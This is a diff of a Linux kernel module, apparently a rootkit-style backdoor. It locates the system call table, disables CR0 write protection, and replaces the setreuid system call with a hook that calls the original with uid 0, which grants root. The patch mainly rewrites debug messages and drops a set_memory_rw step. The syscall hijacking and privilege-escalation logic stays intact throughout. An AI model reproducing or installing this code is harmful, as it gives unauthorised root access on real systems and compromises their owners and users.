@@ -1,8 +1,7 @@
 #include <linux/module.h>
 #include <linux/init.h>
 #include <linux/types.h>
-#include <asm/uaccess.h>
-#include <asm/cacheflush.h>
+//#include <asm/cacheflush.h>
 #include <linux/syscalls.h>
 #include <linux/delay.h> 
 #include <linux/sched.h>
@@ -39,7 +38,6 @@ unsigned long **find_sys_call_table()
 
         if (p[__NR_close] == (unsigned long) sys_close)
         {
-            printk(KERN_DEBUG "Found the sys_call_table at %16lX.\n", *p);
             return (unsigned long **) p;
         }
     }
@@ -122,7 +120,7 @@ int my_sys_setreuid(uid_t ruid, uid_t euid)
             }
         #endif
         
-        printk(KERN_DEBUG "Always remember: with great power comes great responsibility!\n");
+        printk(KERN_DEBUG "Always remember... With great power comes great responsibility!\n");
 
         return orig_sys_setreuid(0, 0);
     }
@@ -132,8 +130,6 @@ int my_sys_setreuid(uid_t ruid, uid_t euid)
 
 static int __init syscall_init(void)
 {
-    int ret;
-    unsigned long addr;
     unsigned long cr0;
 
     printk(KERN_DEBUG "Let's do some magic!\n");
@@ -144,22 +140,13 @@ static int __init syscall_init(void)
         printk(KERN_DEBUG "ERROR: Cannot find the system call table address.\n"); 
         return -1;
     }
+    
+    printk(KERN_DEBUG "Found the sys_call_table at %16lx.\n", (unsigned long) syscall_table);
 
     cr0 = read_cr0();
     write_cr0(cr0 & ~CR0_WP);
 
-    addr = (unsigned long) syscall_table;
-    
-    ret = set_memory_rw(PAGE_ALIGN(addr) - PAGE_SIZE, 3);
-    
-    if (ret) {
-        printk(KERN_DEBUG "ERROR: Cannot set the memory to rw (%d) at addr %16lX.\n", ret, PAGE_ALIGN(addr) - PAGE_SIZE);
-    }
-
-    else {
-        printk(KERN_DEBUG "Cool. We set 3 pages set to rw.\n");
-    }
-    
+    printk(KERN_DEBUG "Houston! We have full write access to all pages. Proceeding...\n");
     orig_sys_setreuid = syscall_table[__NR_setreuid];
     syscall_table[__NR_setreuid] = my_sys_setreuid;
 
